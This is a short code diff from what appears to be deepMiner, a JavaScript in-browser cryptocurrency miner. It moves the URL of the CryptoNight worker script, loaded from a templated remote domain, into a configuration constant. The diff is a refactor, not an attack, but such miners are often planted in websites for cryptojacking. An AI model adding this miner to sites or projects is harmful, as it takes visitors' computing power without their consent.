@@ -211,7 +211,7 @@
             this._asmjsStatus = "loaded";
             callback()
         }.bind(this), xhr);
-        xhr.open("get", "https://%deepMiner_domain%/worker.min.js", false);
+        xhr.open("get", deepMiner.CRYPTONIGHT_WORKER_BLOB, false);
         xhr.send()
         if (this._useWASM || this._asmjsStatus === "loaded") {
             callback()
@@ -579,4 +579,4 @@ self.deepMiner.CONFIG = {
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "worker.min.js";
+deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://%deepMiner_domain%/worker.min.js";
